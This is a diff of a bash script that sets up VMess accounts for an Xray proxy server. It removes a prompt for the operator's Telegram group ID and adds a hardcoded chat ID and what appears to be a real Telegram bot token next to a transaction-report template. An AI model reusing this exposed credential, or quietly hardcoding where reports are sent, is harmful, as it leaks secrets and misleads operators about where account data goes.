@@ -170,7 +170,7 @@ until [[ $user =~ ^[a-zA-Z0-9_]+$ && ${CLIENT_EXISTS} == '0' ]]; do
 
 read -rp "   Input Username : " -e user
 read -p "   Owner     : " OWNER
-read -p "Input Id Grup (-1001911868043) : " CHATIDGC
+
       
 if [ -z $user ]; then
 echo -e " [Error] Username cannot be empty "
@@ -256,6 +256,9 @@ vmesslink2="vmess://$(echo $ask | base64 -w 0)"
 vmesslink3="vmess://$(echo $grpc | base64 -w 0)"
 systemctl restart xray > /dev/null 2>&1
 service cron restart > /dev/null 2>&1
+TIMES="10"
+CHATID="5736569839"
+KEY="6409879237:AAE1vPwbqfiWmRkV-AbCa6-tepM5w5FTGz0"
 TRX="
 <code>INFO MASKU -Transaksi</code>
 <code>────────────────────</code>
